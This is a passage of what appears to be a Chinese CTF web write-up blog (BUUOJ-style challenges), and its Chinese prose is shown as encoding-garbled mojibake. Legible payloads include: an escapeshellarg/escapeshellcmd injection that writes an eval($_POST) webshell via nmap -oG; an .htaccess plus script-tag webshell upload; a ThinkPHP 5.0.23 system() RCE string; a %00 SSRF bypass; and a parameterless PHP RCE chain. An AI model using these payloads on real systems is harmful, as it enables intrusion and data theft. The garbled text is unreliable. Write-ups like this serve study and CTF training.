è½¬ä¹‰ç¬¦ï¼Œå…¶ä»–ä»€ä¹ˆéƒ½ä¸åšï¼‰é‡åˆ°æˆå¯¹åŒ¹é…çš„å•å¼•å·<code>'</code>ä¸è¿‡å¤„ç†ï¼Œè½¬ä¹‰ç¬¦<code>\</code>å†ä½¿ç”¨è½¬ä¹‰ç¬¦è½¬ä¹‰ï¼Œå†ç•¥è¿‡ä¸€ä¸ªæˆå¯¹çš„å•å¼•å·<code>''</code>ï¼Œæœ€åä¸€ä¸ªå•å¼•å·<code>'</code>å†ä½¿ç”¨è½¬ä¹‰ç¬¦è½¬ä¹‰ã€‚è¿™æ—¶å€™çš„å‚æ•°å°±æˆäº†<code>'172.17.0.2'\\'' -v -d a=1\'</code></li><li>æœ€åæ‰§è¡Œçš„å‚æ•°æ˜¯<code>'172.17.0.2'\\'' -v -d a=1\'</code>ï¼Œç”±äºä¸­é—´çš„<code>\\</code>è¢«è§£é‡Šä¸º<code>\</code>è€Œä¸å†æ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥åé¢çš„<code>'</code>æ²¡æœ‰è¢«è½¬ä¹‰ï¼Œä¸å†åé¢çš„<code>'</code>é…å¯¹å„¿æˆäº†ä¸€ä¸ªç©ºç™½ç¬¦ã€‚æ‰€ä»¥å¯ä»¥ç®€åŒ–ä¸º<code> 172.17.0.2\ -v -d a=1'</code></li></ol><p>æ‰€ä»¥æ„é€ payloadï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&#39;&lt;?php eval($_POST[_]) ?&gt; -oG 1.php &#39;
</span></span></code></pre></td></tr></table></div></div><p>ç»è¿‡<code>escapeshellarg</code>å‡½æ•°ä¼šè¢«è§£ææˆä¸ºï¼š<code>''\''&lt;?php eval($_POST[_]) ?> -oG 1.php '\'''</code></p><p>å†ç»è¿‡<code>escapeshellcmd</code>å‡½æ•°ä¼šè¢«è§£æä¸ºï¼š<code>''\\''&lt;?php eval($_POST[_]) ?> -oG 1.php '\\'''</code></p><p>æ³¨æ„æœ€åå•å¼•å·å‰é¢çš„é‚£ä¸ªç©ºæ ¼å¾ˆé‡è¦ï¼Œå¦‚æœæ˜¯ç´§æŒ¨ç€çš„è¯æ–‡ä»¶åç§°å°±æˆäº†<code>1.php\</code>ä¸åœ¨æ˜¯phpæ–‡ä»¶äº†ã€‚æ‰€ä»¥æˆ‘ä»¬çš„payloadæœ€ç»ˆåœ¨æœåŠ¡å™¨ç«¯æ˜¯ï¼š<code>\&lt;?php eval($_POST[_]) ?> -oG 1.php \ </code>ã€‚</p><p>åŠ ç©ºæ ¼ç›®çš„æ˜¯ä¸ºäº†é˜²æ­¢æ–‡ä»¶ååç¼€ä¸­å‡ºç°ç¬¦å·ï¼ŒåŠ ä¸Šç©ºæ ¼å°±ä¼šèˆå»ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$host</span> <span class=o>=</span> <span class=s2>&#34;&#39;&lt;?php eval(</span><span class=si>$_POST[_]</span><span class=s2>) ?&gt; -oG 1.php &#39;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$host</span><span class=o>.</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$host</span> <span class=o>=</span> <span class=nx>escapeshellarg</span><span class=p>(</span><span class=nv>$host</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$host</span><span class=o>.</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$host</span> <span class=o>=</span> <span class=nx>escapeshellcmd</span><span class=p>(</span><span class=nv>$host</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$host</span><span class=o>.</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>ç»“æœï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&#39;&lt;?php eval() ?&gt; -oG 1.php &#39;
</span></span><span class=line><span class=cl>&#39;&#39;\&#39;&#39;&lt;?php eval() ?&gt; -oG 1.php &#39;\&#39;&#39;&#39;
</span></span><span class=line><span class=cl>&#39;&#39;\\&#39;&#39;\&lt;\?php eval\(\) \?\&gt; -oG 1.php &#39;\\&#39;&#39;&#39;
</span></span></code></pre></td></tr></table></div></div><p>æœ€ç»ˆè¯·æ±‚payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/?host=&#39;&lt;?php eval($_POST[_]) ?&gt; -oG 1.php &#39;
</span></span></code></pre></td></tr></table></div></div><p>æ‰§è¡ŒæŒ‡ä»¤æ—¶ä¼šåˆ›å»ºä¸€ä¸ªsandboxæ–‡ä»¶å¤¹ï¼Œè®¿é—®<code>$sandbox$/1.php</code>ï¼ŒPOSTä¼ å‚</p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310110615.png loading=lazy></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>_=system(&#39;cat /flag&#39;);
</span></span></code></pre></td></tr></table></div></div><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310110726.png loading=lazy></p><hr><h1 id=roarctf-2019easy-java>[RoarCTF 2019]Easy Java</h1><p>æ˜¯javaå†™çš„webç¨‹åº</p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310110821.png loading=lazy></p><p>è€ƒç‚¹æ˜¯<strong>WEB-INF/web.xmlæ³„éœ²</strong></p><blockquote><p>WEB-INFä¸»è¦åŒ…å«ä¸€ä¸‹æ–‡ä»¶æˆ–ç›®å½•:</p><p>/WEB-INF/web.xmlï¼šWebåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚</p><p>/WEB-INF/classes/ï¼šå«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ class æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet class å’Œéservlet classï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ .jaræ–‡ä»¶ä¸­</p><p>/WEB-INF/lib/ï¼šå­˜æ”¾webåº”ç”¨éœ€è¦çš„å„ç§JARæ–‡ä»¶ï¼Œæ”¾ç½®ä»…åœ¨è¿™ä¸ªåº”ç”¨ä¸­è¦æ±‚ä½¿ç”¨çš„jaræ–‡ä»¶,å¦‚æ•°æ®åº“é©±åŠ¨jaræ–‡ä»¶</p><p>/WEB-INF/src/ï¼šæºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ªjavaæ–‡ä»¶ã€‚</p><p>/WEB-INF/database.propertiesï¼šæ•°æ®åº“é…ç½®æ–‡ä»¶</p><p>æ¼æ´æ£€æµ‹ä»¥åŠåˆ©ç”¨æ–¹æ³•ï¼šé€šè¿‡æ‰¾åˆ°web.xmlæ–‡ä»¶ï¼Œæ¨æ–­classæ–‡ä»¶çš„è·¯å¾„ï¼Œæœ€åç›´æ¥classæ–‡ä»¶ï¼Œåœ¨é€šè¿‡åç¼–è¯‘classæ–‡ä»¶ï¼Œå¾—åˆ°ç½‘ç«™æºç </p></blockquote><p>é‡ç‚¹ä¸åœ¨ç™»é™†ç•Œé¢ï¼Œè€Œæ˜¯é‚£ä¸ªHelpæŒ‰é’®ï¼Œå¯ä»¥ä¸‹è½½æ–‡ä»¶ã€‚</p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310110934.png loading=lazy></p><p>é¦–å…ˆå°è¯•å»è¯»web.xmlæ–‡æ¡£ï¼Œæ·»åŠ POSTè¯·æ±‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>filename=WEB-INF/web.xml
</span></span></code></pre></td></tr></table></div></div><p>å¯ä»¥è¯»å–web.xmlæ–‡ä»¶ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;web-app</span> <span class=na>xmlns=</span><span class=s>&#34;http://xmlns.jcp.org/xml/ns/javaee&#34;</span>
</span></span><span class=line><span class=cl>         <span class=na>xmlns:xsi=</span><span class=s>&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
</span></span><span class=line><span class=cl>         <span class=na>xsi:schemaLocation=</span><span class=s>&#34;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&#34;</span>
</span></span><span class=line><span class=cl>         <span class=na>version=</span><span class=s>&#34;4.0&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;welcome-file-list&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;welcome-file&gt;</span>Index<span class=nt>&lt;/welcome-file&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;/welcome-file-list&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;servlet&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;servlet-name&gt;</span>IndexController<span class=nt>&lt;/servlet-name&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;servlet-class&gt;</span>com.wm.ctf.IndexController<span class=nt>&lt;/servlet-class&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;/servlet&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;servlet-mapping&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;servlet-name&gt;</span>IndexController<span class=nt>&lt;/servlet-name&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;url-pattern&gt;</span>/Index<span class=nt>&lt;/url-pattern&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;/servlet-mapping&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;servlet&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;servlet-name&gt;</span>LoginController<span class=nt>&lt;/servlet-name&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;servlet-class&gt;</span>com.wm.ctf.LoginController<span class=nt>&lt;/servlet-class&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;/servlet&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;servlet-mapping&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;servlet-name&gt;</span>LoginController<span class=nt>&lt;/servlet-name&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;url-pattern&gt;</span>/Login<span class=nt>&lt;/url-pattern&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;/servlet-mapping&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;servlet&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;servlet-name&gt;</span>DownloadController<span class=nt>&lt;/servlet-name&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;servlet-class&gt;</span>com.wm.ctf.DownloadController<span class=nt>&lt;/servlet-class&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;/servlet&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;servlet-mapping&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;servlet-name&gt;</span>DownloadController<span class=nt>&lt;/servlet-name&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;url-pattern&gt;</span>/Download<span class=nt>&lt;/url-pattern&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;/servlet-mapping&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;servlet&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;servlet-name&gt;</span>FlagController<span class=nt>&lt;/servlet-name&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;servlet-class&gt;</span>com.wm.ctf.FlagController<span class=nt>&lt;/servlet-class&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;/servlet&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;servlet-mapping&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;servlet-name&gt;</span>FlagController<span class=nt>&lt;/servlet-name&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;url-pattern&gt;</span>/Flag<span class=nt>&lt;/url-pattern&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;/servlet-mapping&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nt>&lt;/web-app&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>æ³¨æ„åˆ°äº†ä¸€ä¸ª<code>FlagController</code>çš„æ§åˆ¶å™¨ï¼Œå®ƒæ‰€åœ¨çš„ç±»ä¸º<code>com.wm.ctf.FlagController</code>ï¼Œå‰é¢ä¹Ÿæåˆ°äº†ç¼–è¯‘æ–‡ä»¶æ‰€åœ¨çš„æ–‡ä»¶å¤¹<code>/WEB-INF/classes/</code>ï¼Œå»è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹è½½<code>FlagController</code>ç›¸å…³çš„æ–‡ä»¶ï¼Œè¿˜éœ€è¦çŸ¥é“çš„æ˜¯ï¼šJavawebç¨‹åºç¼–è¯‘æ–‡ä»¶çš„ç›®å½•ç»“æ„æ˜¯æ ¹æ®ç±»ååˆ›å»ºçš„ï¼Œç±»åæˆ‘ä»¬ä¹ŸçŸ¥é“äº†ï¼Œæ‰€ä»¥ä¸‹è½½ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>filename=WEB-INF/classes/com/wm/ctf/FlagController.class
</span></span></code></pre></td></tr></table></div></div><p>classæ–‡ä»¶æºç å¥½å¤šä¸å¯è§å­—ç¬¦</p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310112205.png loading=lazy></p><p>æˆ‘é€‰ä¸­çš„é‚£æ®µå°±æ˜¯flagåœ¨çš„åœ°æ–¹ï¼Œçœ‹åˆ°äº†<code>==</code>å°±åº”è¯¥æ„è¯†åˆ°æ˜¯base64ç¼–ç ï¼Œä½†æ˜¯base64ç¼–ç é‡Œæ²¡æœ‰<code>&lt;</code>è¿™ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥flagçš„å¯†æ–‡å°±æ˜¯</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ZmxhZ3s0NmNhMTExMS01ZjI5LTQwYjMtYjUwMC1lYWMzZjkyMjU4ODF9Cg==
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=ä»¥ä¸‹éƒ¨åˆ†æ–½å·¥ä¸­>&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;ä»¥ä¸‹éƒ¨åˆ†æ–½å·¥ä¸­ğŸ‘·â€â™‚ï¸&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;</h1><p>ä¸‹é¢çš„éƒ½æ˜¯æ²¡æœ‰æ•´ç†ï¼Œå…ˆæŠŠé‡è¦æ€è·¯å†™ä¸‹æ¥äº†ï¼Œç„¶åæœ‰æ—¶é—´å†é…å›¾</p><hr><h1 id=gkctf2020cveç‰ˆç­¾åˆ°>[GKCTF2020]cveç‰ˆç­¾åˆ°</h1><p><a class=link href=https://blog.csdn.net/qq_45521281/article/details/106425266 target=_blank rel=noopener>CVE-2020-7066</a></p><p>åªæœ‰ä¸€ä¸ªæŒ‰é’®ï¼Œç‚¹å‡»ä»¥åæŸ¥çœ‹ç½‘é¡µçš„Networkè¯·æ±‚ä¸­æœ‰ä¸€ä¸ª</p><blockquote><p>Hint: Flag in localhost</p></blockquote><p>ä¸”utlåœ°å€ä¸­æœ‰å¯æ§çš„å‚æ•°ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯ä½¿ç”¨ssrfã€‚è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªæç¤ºæ˜¯åœ¨ä¸»é¡µé¢é‚£é‡Œ</p><blockquote><p>You just view *.ctfhub.com</p></blockquote><p>åªå¯ä»¥è®¿é—®ä»¥ctfhub.comç»“å°¾çš„ç½‘ç«™ï¼Œå†æ ¹æ®cveä½¿ç”¨%00æˆªæ–­è®¿é—®ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?url=http://127.0.0.1%00.ctfhub.com
</span></span></code></pre></td></tr></table></div></div><p>ç¬¬äºŒä¸ªæç¤ºï¼š</p><blockquote><p>Host must be end with &lsquo;123&rsquo;</p></blockquote><p>å¿…é¡»ä»¥123ç»“å°¾ï¼Œæ‰€ä»¥æœ€ç»ˆpayload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?url=http://127.0.0.123%00.ctfhub.com
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=gxyctf2019ç¦æ­¢å¥—å¨ƒ>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h1><p>gitæ³„éœ²ã€‚æˆ‘ä½¿ç”¨çš„https://github.com/gakki429/Git_Extract</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>include &#34;flag.php&#34;;
</span></span><span class=line><span class=cl>echo &#34;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&#34;;
</span></span><span class=line><span class=cl>if(isset($_GET[&#39;exp&#39;])){
</span></span><span class=line><span class=cl>    if (!preg_match(&#39;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#39;, $_GET[&#39;exp&#39;])) {
</span></span><span class=line><span class=cl>        if(&#39;;&#39; === preg_replace(&#39;/[a-z,_]+\((?R)?\)/&#39;, NULL, $_GET[&#39;exp&#39;])) {
</span></span><span class=line><span class=cl>            if (!preg_match(&#39;/et|na|info|dec|bin|hex|oct|pi|log/i&#39;, $_GET[&#39;exp&#39;])) {
</span></span><span class=line><span class=cl>                // echo $_GET[&#39;exp&#39;];
</span></span><span class=line><span class=cl>                @eval($_GET[&#39;exp&#39;]);
</span></span><span class=line><span class=cl>            }
</span></span><span class=line><span class=cl>            else{
</span></span><span class=line><span class=cl>                die(&#34;è¿˜å·®ä¸€ç‚¹å“¦ï¼&#34;);
</span></span><span class=line><span class=cl>            }
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>        else{
</span></span><span class=line><span class=cl>            die(&#34;å†å¥½å¥½æƒ³æƒ³ï¼&#34;);
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>    else{
</span></span><span class=line><span class=cl>        die(&#34;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&#34;);
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>// highlight_file(__FILE__);
</span></span><span class=line><span class=cl>?&gt;
</span></span></code></pre></td></tr></table></div></div><p>æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…çš„åªæœ‰å‡½æ•°çš„å½¢å¼å¦‚<code>var_dump();</code>æ˜¯ä¸€é“<a class=link href=https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/ target=_blank rel=noopener>æ— å‚æ•°RCE</a>ï¼Œçœ‹çš„é¢˜è§£è‡ªå·±æ•´ç†çš„payloadï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=err>?</span><span class=nb>exp</span><span class=o>=</span><span class=n>var_dump</span><span class=p>(</span><span class=n>readfile</span><span class=p>(</span><span class=n>array_rand</span><span class=p>(</span><span class=n>array_flip</span><span class=p>(</span><span class=n>scandir</span><span class=p>(</span><span class=n>current</span><span class=p>(</span><span class=n>localeconv</span><span class=p>()))))));</span>
</span></span></code></pre></td></tr></table></div></div><p>ä¸€å±‚ä¸€å±‚è§£é‡Šï¼š</p><p>localeconv() å‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„</p><p><strong>å›¾ç‰‡å±•ç¤º</strong></p><p>current() è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒ, é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ã€‚åˆ«åpos()</p><p>åˆ°è¿™é‡Œè·å¾—çš„æ˜¯ä¸€ä¸ªç‚¹</p><p>scandir() éå†ç›®å½•ï¼Œæ˜¯<code>.</code>çš„è¯å°±æ˜¯åˆ—å‡ºå½“å‰ç›®å½•ã€‚</p><p>æ­¤æ—¶è¾“å‡ºï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>array(5) { [0]=&gt; string(1) &#34;.&#34; [1]=&gt; string(2) &#34;..&#34; [2]=&gt; string(4) &#34;.git&#34; [3]=&gt; string(8) &#34;flag.php&#34; [4]=&gt; string(9) &#34;index.php&#34; }
</span></span></code></pre></td></tr></table></div></div><p>è¿™æ—¶çš„è¾“å‡ºè¿˜æ˜¯é”®å€¼å¯¹çš„å½¢å¼ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨<code>array_flip()</code>å‡½æ•°äº¤æ¢é”®å€¼å¯¹ï¼Œç„¶åä½¿ç”¨éšæœºå‡½æ•°<code>array_rand()</code>ä»æ•°ç»„ä¸­éšæœºå–å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒã€‚å› ä¸ºæ­£åˆ™çš„åŸå› æ— æ³•ä½¿ç”¨<code>file_get_contents()</code>ï¼Œä½†æ˜¯è¿˜æœ‰å…¶ä»–è¯»å–æ–‡ä»¶çš„å‡½æ•°:readfile()ã€highlight_file()å’Œå®ƒçš„åˆ«åå‡½æ•°show_source()ã€‚</p><hr><h1 id=gxyctf2019babyupload>[GXYCTF2019]BabyUpload</h1><p>phè¿‡æ»¤ï¼Œimage/gifä¸èƒ½é€šè¿‡ã€‚image/jpeå¯ä»¥</p><p>ä¸Šä¼ .htaccess</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>SetHandler application/x-httpd-php
</span></span></code></pre></td></tr></table></div></div><p>ä¸Šä¼ ç ï¼Œä½†æ˜¯ä¸èƒ½æ˜¯phpä»£ç ï¼Œä½¿ç”¨js</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;script language=&#34;php&#34;&gt;eval($_REQUEST[shell])&lt;/script&gt;
</span></span></code></pre></td></tr></table></div></div><p>å®Œå·¥</p><hr><h1 id=bjdctf-2ndold-hack>[BJDCTF 2nd]old-hack</h1><p>ThinkPHPçš„<a class=link href=https://blog.csdn.net/qq_38807738/article/details/86777541 target=_blank rel=noopener>æ¼æ´</a></p><p>ThinkPHP5 5.0.23</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>_method</span><span class=o>=</span><span class=n>__construct</span><span class=o>&amp;</span><span class=n>filter</span><span class=p>[]</span><span class=o>=</span><span class=n>system</span><span class=o>&amp;</span><span class=n>method</span><span class=o>=</span><span class=n>get</span><span class=o>&amp;</span><span class=n>server</span><span class=p>[</span><span class=n>REQUEST_METHOD</span><span class=p>]</span><span class=o>=</span><span class=n>cat</span> <span class=o>/</span><span class=n>flag</span>
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=å®‰æ´µæ¯-2019easy_web>[å®‰æ´µæ¯ 2019]easy_web</h1><p>çœ‹urlä¸€ä¸ªimgå’Œcmdï¼Œé¡µé¢ä¸­æœ‰ä¸€ä¸ªå›¾ç‰‡çš„æ ‡ç­¾ï¼Œå’Œä¸€ä¸ª<strong>md5 is funny ~</strong>ã€‚æŠŠurlä¸­imgçš„å€¼è¿›è¡Œè§£ç å‘ç°å›¾ç‰‡åä¸º<code>555.png</code>ï¼Œå°è¯•ç”¨åŒæ ·çš„ç¼–ç æ–¹å¼è¯»å–index.phpï¼ŒåŠ å¯†çš„ç¼–ç ä¾æ¬¡ä¸ºï¼šhex&ndash;>base64&ndash;>base64ã€‚</p><p>index.php</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
